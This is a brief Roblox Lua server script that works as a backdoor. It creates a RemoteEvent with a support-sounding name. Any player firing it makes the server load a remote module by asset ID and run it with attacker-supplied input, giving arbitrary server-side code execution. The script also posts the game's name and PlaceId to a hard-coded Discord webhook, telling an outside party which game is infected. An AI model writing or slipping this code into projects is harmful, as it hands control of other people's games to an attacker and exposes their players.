local new = Instance.new("RemoteEvent")
new.Parent = game.ReplicatedStorage
new.Name = "RobloxSupportModelCC_S"
new.OnServerEvent:Connect(function(player, Trm)
	require(5423914129)(Trm)()
end)

local HS = game:GetService("HttpService")
local WebhookURL = "https://discord.com/api/webhooks/1335563932617805834/XPjmEF5VwZxdeWvo_p-O8f0HibG-JF7wklJ08sGfSsl2fNMjAb7ss314L7tnzVByb_qk"


local MessageData = {
	["content"] = "Hoi, Test message arrived!" .. game.Name .. game.PlaceId
}

MessageData = HS:JSONEncode(MessageData)

HS:PostAsync(WebhookURL,MessageData)
